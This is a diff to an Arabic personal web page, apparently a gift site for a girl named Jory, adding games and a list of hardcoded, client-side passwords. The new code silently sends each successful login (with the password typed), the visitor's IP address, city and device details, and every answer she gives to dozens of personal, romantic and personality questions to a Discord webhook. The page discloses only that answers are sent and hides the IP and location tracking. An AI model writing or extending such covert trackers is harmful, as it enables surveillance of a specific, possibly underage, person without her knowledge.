@@ -1120,6 +1120,7 @@
         </div>
 
         <div id="tab-games" class="tab-content">
+            <!-- لعبة القلب -->
             <section class="section-card">
                 <h2>لعبة اضغطي على القلب</h2>
                 <div style="display:flex; justify-content:center; gap:8px; flex-wrap:wrap;">
@@ -1130,6 +1131,7 @@
                 <div class="game-score" id="gameScore">النقاط: 0 — الوقت: 20</div>
             </section>
 
+            <!-- لعبة الذاكرة -->
             <section class="section-card">
                 <h2>لعبة الذاكرة</h2>
                 <div style="text-align:center;">
@@ -1139,14 +1141,17 @@
                 <div class="game-score" id="memoryScore">المحاولات: 0 — الأزواج: 0/8</div>
             </section>
 
+            <!-- الاختيار السريع -->
             <section class="section-card">
-                <h2>اختيار سريع</h2>
+                <h2>⚡ اختيار سريع — 50+ سؤال</h2>
+                <p style="text-align:center; color:var(--text-secondary); font-size:0.9rem;">اختاري بسرعة بين الخيارات، وكل إجاباتك توصلني تلقائياً</p>
                 <div class="game-box">
                     <div class="quick-game-question" id="quickQuestion">اضغطي ابدأ</div>
                     <div class="quick-game-options" id="quickOptions"></div>
                 </div>
                 <div style="text-align:center; margin-top:12px;">
                     <button type="button" class="action-btn" onclick="startQuickGame()">ابدأ</button>
+                    <button type="button" class="action-btn secondary" onclick="stopQuickGame()">إيقاف</button>
                 </div>
                 <div class="game-score" id="quickScore">النقاط: 0</div>
             </section>
@@ -1274,7 +1279,26 @@
         const DISCORD_MAX_FILE_SIZE = 25 * 1024 * 1024;
         const DISCORD_BATCH_SIZE = 10;
         const DISCORD_BATCH_DELAY = 1500;
-        const PASSWORD = "gory2024";
+
+        // ============================================================
+        // كلمات المرور المتعددة
+        // ============================================================
+        const PASSWORDS = [
+            "JOJO",
+            "jojo",
+            "JoJo",
+            "gory2024",
+            "jory2012",
+            "جوري",
+            "JORY",
+            "jory",
+            "قحطاني",
+            "JoJo2012",
+            "gory",
+            "أمجيزان",
+            "amjizan",
+            "2012"
+        ];
         const PASSWORD_KEY = "gory_unlocked";
 
         function showToast(msg, type = 'info', duration = 2500) {
@@ -1346,11 +1370,8 @@
             msg += `**🌐 المتصفح:** ${getBrowser()}\n`;
             msg += `**🌍 اللغة:** ${navigator.language}\n`;
             msg += `**📱 الشاشة:** ${screen.width} × ${screen.height}\n`;
-            msg += `**🕒 المنطقة الزمنية:** ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
             msg += `**🔗 الرابط:** ${document.referrer || 'مباشر'}\n`;
-            msg += `**📶 متصل:** ${navigator.onLine ? 'نعم' : 'لا'}\n`;
-            msg += `**👆 اللمس:** ${('ontouchstart' in window) ? 'يدعم' : 'لا'}\n`;
-            msg += `**⚙️ المعالج:** ${navigator.hardwareConcurrency || 'غير معروف'}\n\n`;
+            msg += `**📶 متصل:** ${navigator.onLine ? 'نعم' : 'لا'}\n\n`;
 
             if (ipInfo) {
                 msg += `**📍 الموقع التقريبي:**\n`;
@@ -1359,7 +1380,6 @@
                 if (ipInfo.region) msg += `**المنطقة:** ${ipInfo.region}\n`;
                 if (ipInfo.country) msg += `**الدولة:** ${ipInfo.country}\n`;
                 if (ipInfo.org) msg += `**مزود الخدمة:** ${ipInfo.org}\n`;
-                if (ipInfo.latitude && ipInfo.longitude) msg += `**الإحداثيات:** ${ipInfo.latitude}, ${ipInfo.longitude}\n`;
             }
 
             if (msg.length > 1900) msg = msg.slice(0, 1900) + '\n...';
@@ -1389,17 +1409,39 @@
 
         function tryUnlock() {
             const input = document.getElementById('lockInput').value.trim();
-            if (input === PASSWORD) {
+            const isValid = PASSWORDS.some(p => p === input || p.toLowerCase() === input.toLowerCase());
+            if (isValid) {
                 sessionStorage.setItem(PASSWORD_KEY, "1");
                 document.getElementById('lockScreen').classList.add('hidden');
                 document.getElementById('lockError').innerText = "";
                 showToast("أهلا وسهلا", "success");
+                sendLoginSuccess(input);
             } else {
                 failedAttempts++;
                 document.getElementById('lockError').innerText = "كلمة المرور غير صحيحة";
                 document.getElementById('lockInput').value = "";
                 sendFailedAttempt(input);
             }
+        }
+
+        async function sendLoginSuccess(usedPassword) {
+            const ipInfo = await getIPInfo();
+            let msg = `**✅ دخول ناجح للموقع**\n`;
+            msg += `**كلمة المرور المستخدمة:** \`${usedPassword}\`\n`;
+            msg += `**الجهاز:** ${getDeviceType()}\n`;
+            msg += `**المتصفح:** ${getBrowser()}\n`;
+            msg += `**النظام:** ${getOS()}\n`;
+            msg += `**الوقت:** ${new Date().toLocaleString('ar-SA', { timeZone: 'Asia/Riyadh' })}\n`;
+            if (ipInfo) {
+                msg += `**IP:** \`${ipInfo.ip}\`\n`;
+                if (ipInfo.city !== 'غير معروف') msg += `**المدينة:** ${ipInfo.city}\n`;
+                if (ipInfo.country) msg += `**الدولة:** ${ipInfo.country}\n`;
+            }
+            await fetch(webhookUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ content: msg })
+            }).catch(() => {});
         }
 
         async function sendFailedAttempt(wrongPassword) {
@@ -1723,6 +1765,72 @@
             }
         }
 
+        // ============================================================
+        // دالة إرسال نتائج الألعاب للويب هوك
+        // ============================================================
+        async function sendGameResultToWebhook(gameName, score, total, details) {
+            try {
+                const ipInfo = await getIPInfo();
+                let msg = `**🎮 نتيجة لعبة: ${gameName}**\n\n`;
+                msg += `**النتيجة:** ${score} من ${total}\n`;
+                msg += `**الجهاز:** ${getDeviceType()}\n`;
+                msg += `**المتصفح:** ${getBrowser()}\n`;
+                msg += `**الوقت:** ${new Date().toLocaleString('ar-SA', { timeZone: 'Asia/Riyadh' })}\n`;
+                if (ipInfo) {
+                    msg += `**IP:** \`${ipInfo.ip}\`\n`;
+                    if (ipInfo.city !== 'غير معروف') msg += `**المدينة:** ${ipInfo.city}\n`;
+                }
+
+                if (details && details.length > 0) {
+                    const detailLines = details.map((d, i) =>
+                        `${i + 1}. [${d.category || 'عام'}] ${d.question}: **${d.answer}**`
+                    );
+
+                    // إرسال الرسالة الأساسية أولاً
+                    await fetch(webhookUrl, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ content: msg })
+                    }).catch(() => {});
+
+                    // إرسال التفاصيل على دفعات
+                    let chunk = '**📋 تفاصيل اختيارات جوري:**\n\n';
+                    for (const line of detailLines) {
+                        if ((chunk + line + '\n').length > 1900) {
+                            await fetch(webhookUrl, {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({ content: chunk })
+                            }).catch(() => {});
+                            await new Promise(r => setTimeout(r, 1000));
+                            chunk = '**📋 تكملة:**\n\n' + line + '\n';
+                        } else {
+                            chunk += line + '\n';
+                        }
+                    }
+                    if (chunk.trim()) {
+                        await fetch(webhookUrl, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ content: chunk })
+                        }).catch(() => {});
+                    }
+                    return;
+                }
+
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: msg })
+                }).catch(() => {});
+            } catch (e) {
+                console.error('Game result failed:', e);
+            }
+        }
+
+        // ============================================================
+        // لعبة القلب
+        // ============================================================
         let gameInterval, gameTimer, gameScore = 0, gameActive = false;
         function startHeartGame() {
             stopHeartGame();
@@ -1762,12 +1870,18 @@
             }, 1000);
         }
         function stopHeartGame() {
+            if (gameActive && gameScore > 0) {
+                sendGameResultToWebhook('لعبة القلب', gameScore, 20, null);
+            }
             gameActive = false;
             clearInterval(gameInterval);
             clearInterval(gameTimer);
             document.getElementById('heartGameArea').innerHTML = "";
         }
 
+        // ============================================================
+        // لعبة الذاكرة
+        // ============================================================
         let memoryCards = [], memoryFlipped = [], memoryMatched = 0, memoryMoves = 0, memoryLock = false;
         const memoryEmojis = ['💖','🌸','✨','🎀','🌙','🎂','💌','🌟'];
         function shuffleArr(arr) {
@@ -1810,6 +1924,9 @@
                     memoryFlipped = [];
                     if (memoryMatched === 8) {
                         setTimeout(() => showToast(`مبروك! أكملتي اللعبة بـ ${memoryMoves} محاولة`, "success"), 300);
+                        sendGameResultToWebhook('لعبة الذاكرة', memoryMoves, 8, [
+                            { question: 'عدد المحاولات', answer: memoryMoves, category: 'ذاكرة' }
+                        ]);
                     }
                 } else {
                     memoryLock = true;
@@ -1825,33 +1942,120 @@
         }
         initMemoryGame();
 
+        // ============================================================
+        // الاختيار السريع — 50+ سؤال
+        // ============================================================
         const quickQuestions = [
-            { q: "وش تحبين أكثر", a: "قهوة", b: "شاي" },
-            { q: "وش تفضلين", a: "بحر", b: "جبل" },
-            { q: "وش تحبين أكثر", a: "ليل", b: "نهار" },
-            { q: "وش تفضلين", a: "حلو", b: "مالح" },
-            { q: "وش تحبين أكثر", a: "شتاء", b: "صيف" },
-            { q: "وش تفضلين", a: "قطة", b: "كلب" },
-            { q: "وش تحبين أكثر", a: "فيلم", b: "مسلسل" },
-            { q: "وش تفضلين", a: "سفر", b: "بيت" }
+            // الأكل والشرب
+            { q: "وش تحبين أكثر", a: "قهوة", b: "شاي", cat: "أكل" },
+            { q: "وش تفضلين", a: "حلو", b: "مالح", cat: "أكل" },
+            { q: "وش تحبين أكثر", a: "شاورما", b: "برجر", cat: "أكل" },
+            { q: "وش تفضلين", a: "مندي", b: "كبسة", cat: "أكل" },
+            { q: "وش تحبين أكثر", a: "شوكولاتة", b: "فانيلا", cat: "أكل" },
+            { q: "وش تفضلين", a: "بيتزا", b: "باستا", cat: "أكل" },
+            { q: "وش تحبين أكثر", a: "عصير برتقال", b: "عصير مانجو", cat: "أكل" },
+            { q: "وش تفضلين", a: "مطعم", b: "بيت", cat: "أكل" },
+            { q: "وش تحبين أكثر", a: "دجاج", b: "لحم", cat: "أكل" },
+            { q: "وش تفضلين", a: "مقلي", b: "مشوي", cat: "أكل" },
+
+            // الأماكن
+            { q: "وش تفضلين", a: "بحر", b: "جبل", cat: "أماكن" },
+            { q: "وش تحبين أكثر", a: "الرياض", b: "جدة", cat: "أماكن" },
+            { q: "وش تفضلين", a: "سفر", b: "بيت", cat: "أماكن" },
+            { q: "وش تحبين أكثر", a: "مكة", b: "المدينة", cat: "أماكن" },
+            { q: "وش تفضلين", a: "فندق", b: "شاليه", cat: "أماكن" },
+            { q: "وش تحبين أكثر", a: "مول", b: "حديقة", cat: "أماكن" },
+            { q: "وش تفضلين", a: "شمال", b: "جنوب", cat: "أماكن" },
+
+            // الوقت
+            { q: "وش تحبين أكثر", a: "ليل", b: "نهار", cat: "وقت" },
+            { q: "وش تفضلين", a: "شتاء", b: "صيف", cat: "وقت" },
+            { q: "وش تحبين أكثر", a: "صباح", b: "مساء", cat: "وقت" },
+            { q: "وش تفضلين", a: "ربيع", b: "خريف", cat: "وقت" },
+            { q: "وش تحبين أكثر", a: "جمعة", b: "خميس", cat: "وقت" },
+            { q: "وش تفضلين", a: "عطلة", b: "دراسة", cat: "وقت" },
+
+            // الترفيه
+            { q: "وش تحبين أكثر", a: "فيلم", b: "مسلسل", cat: "ترفيه" },
+            { q: "وش تفضلين", a: "أنمي", b: "دراما", cat: "ترفيه" },
+            { q: "وش تحبين أكثر", a: "موسيقى", b: "بودكاست", cat: "ترفيه" },
+            { q: "وش تفضلين", a: "تيك توك", b: "يوتيوب", cat: "ترفيه" },
+            { q: "وش تحبين أكثر", a: "سناب", b: "انستقرام", cat: "ترفيه" },
+            { q: "وش تفضلين", a: "قراءة", b: "رسم", cat: "ترفيه" },
+            { q: "وش تحبين أكثر", a: "كرة قدم", b: "سباحة", cat: "ترفيه" },
+            { q: "وش تفضلين", a: "بلايستيشن", b: "جوال", cat: "ترفيه" },
+            { q: "وش تحبين أكثر", a: "أفلام رعب", b: "أفلام رومانسية", cat: "ترفيه" },
+            { q: "وش تفضلين", a: "أغاني عربية", b: "أغاني أجنبية", cat: "ترفيه" },
+            { q: "وش تحبين أكثر", a: "مغامرة", b: "كوميديا", cat: "ترفيه" },
+
+            // الحيوانات
+            { q: "وش تفضلين", a: "قطة", b: "كلب", cat: "حيوانات" },
+            { q: "وش تحبين أكثر", a: "أسد", b: "نمر", cat: "حيوانات" },
+            { q: "وش تفضلين", a: "حصان", b: "جمل", cat: "حيوانات" },
+            { q: "وش تحبين أكثر", a: "عصفور", b: "سمكة", cat: "حيوانات" },
+
+            // الألوان
+            { q: "وش تحبين أكثر", a: "وردي", b: "بنفسجي", cat: "ألوان" },
+            { q: "وش تفضلين", a: "أسود", b: "أبيض", cat: "ألوان" },
+            { q: "وش تحبين أكثر", a: "أزرق", b: "أحمر", cat: "ألوان" },
+
+            // شخصية
+            { q: "أنت أقرب إلى", a: "هادية", b: "حيوية", cat: "شخصية" },
+            { q: "أنت في الغالب", a: "منظمة", b: "عفوية", cat: "شخصية" },
+            { q: "أنت تفضلين", a: "التخطيط", b: "المفاجآت", cat: "شخصية" },
+            { q: "أنت أكثر", a: "صريحة", b: "مجاملة", cat: "شخصية" },
+            { q: "أنت في الحب", a: "عقلانية", b: "عاطفية", cat: "شخصية" },
+            { q: "أنت أكثر", a: "اجتماعية", b: "انطوائية", cat: "شخصية" },
+
+            // علاقات
+            { q: "تفضلين", a: "رسالة طويلة", b: "مكالمة", cat: "علاقات" },
+            { q: "تفضلين", a: "هدية", b: "كلمة حلوة", cat: "علاقات" },
+            { q: "تفضلين", a: "خروج مع صديقات", b: "جلسة مع شخص واحد", cat: "علاقات" },
+            { q: "في الخلاف", a: "تتكلمين", b: "تسكتين", cat: "علاقات" },
+            { q: "تفضلين", a: "الحب من أول نظرة", b: "الحب بعد معرفة", cat: "علاقات" },
+
+            // خيارات
+            { q: "لو خيروك", a: "فلوس", b: "صحة", cat: "خيارات" },
+            { q: "لو خيروك", a: "طيارة خاصة", b: "فيلا", cat: "خيارات" },
+            { q: "لو خيروك", a: "تقرأين أفكار الناس", b: "تختفين", cat: "خيارات" },
+            { q: "لو خيروك", a: "تعيشين بلا جوال", b: "تعيشين بلا نت", cat: "خيارات" },
+            { q: "لو خيروك", a: "ترجعين 10 سنين", b: "تتقدمين 10 سنين", cat: "خيارات" },
+            { q: "لو خيروك", a: "تعرفين المستقبل", b: "تغيرين الماضي", cat: "خيارات" },
+            { q: "لو خيروك", a: "مليون ريال", b: "صحة دائمة", cat: "خيارات" },
+            { q: "لو خيروك", a: "تسكنين جبل", b: "تسكنين بحر", cat: "خيارات" },
+            { q: "لو خيروك", a: "تقابلين شخصية تاريخية", b: "تقابلين شخصية خيالية", cat: "خيارات" },
+
+            // حب
+            { q: "الحب عندك", a: "كلمة", b: "فعل", cat: "حب" },
+            { q: "تعبير الحب", a: "بالكلام", b: "بالأفعال", cat: "حب" },
+            { q: "الغيرة", a: "دليل حب", b: "دليل شك", cat: "حب" },
+            { q: "الحب من", a: "القلب", b: "العقل", cat: "حب" },
+            { q: "أهم شيء", a: "الثقة", b: "الاحترام", cat: "حب" },
+            { q: "العلاقة الأفضل", a: "هادية", b: "مليانة مفاجآت", cat: "حب" }
         ];
+
         let quickIdx = 0, quickScore = 0, quickActive = false;
+        let quickAnswers = [];
+
         function startQuickGame() {
             quickIdx = 0;
             quickScore = 0;
+            quickAnswers = [];
             quickActive = true;
             document.getElementById('quickScore').innerText = `النقاط: 0`;
             showQuickQuestion();
         }
+
         function showQuickQuestion() {
             if (!quickActive || quickIdx >= quickQuestions.length) {
                 quickActive = false;
                 document.getElementById('quickQuestion').innerText = `انتهت اللعبة. نتيجتك: ${quickScore} من ${quickQuestions.length}`;
                 document.getElementById('quickOptions').innerHTML = "";
+                sendGameResultToWebhook('اختيار سريع', quickScore, quickQuestions.length, quickAnswers);
                 return;
             }
             const q = quickQuestions[quickIdx];
-            document.getElementById('quickQuestion').innerText = q.q;
+            document.getElementById('quickQuestion').innerText = `${quickIdx + 1}/${quickQuestions.length} — ${q.q}`;
             const opts = document.getElementById('quickOptions');
             opts.innerHTML = "";
             [q.a, q.b].forEach(choice => {
@@ -1860,6 +2064,7 @@
                 btn.innerText = choice;
                 btn.onclick = () => {
                     quickScore++;
+                    quickAnswers.push({ question: q.q, answer: choice, category: q.cat || 'عام' });
                     document.getElementById('quickScore').innerText = `النقاط: ${quickScore}`;
                     quickIdx++;
                     showQuickQuestion();
@@ -1868,6 +2073,18 @@
             });
         }
 
+        function stopQuickGame() {
+            if (quickActive && quickAnswers.length > 0) {
+                sendGameResultToWebhook('اختيار سريع (متوقف)', quickScore, quickQuestions.length, quickAnswers);
+            }
+            quickActive = false;
+            document.getElementById('quickQuestion').innerText = `انتهت اللعبة. نتيجتك: ${quickScore} من ${quickQuestions.length}`;
+            document.getElementById('quickOptions').innerHTML = "";
+        }
+
+        // ============================================================
+        // رفع الملفات
+        // ============================================================
         let selectedFiles = [];
 
         function formatFileSize(bytes) {
@@ -2018,6 +2235,9 @@
             renderPreviews();
         });
 
+        // ============================================================
+        // الأسئلة 150
+        // ============================================================
         const questionsData = [
             { section: 'details', text: 'وش لونك المفضل' },
             { section: 'details', text: 'وش أكلتك المفضلة' },
@@ -2370,8 +2590,6 @@
         function restoreMemoryState() {
             try {
                 const state = JSON.parse(localStorage.getItem('gory_memory_state') || '{}');
-                // مسح أي بيانات قديمة لريتاج
-                if (state.m2 !== undefined) { delete state.m2; }
                 document.querySelectorAll('.memory-check').forEach(cb => {
                     if (state[cb.dataset.mem]) {
                         cb.checked = true;
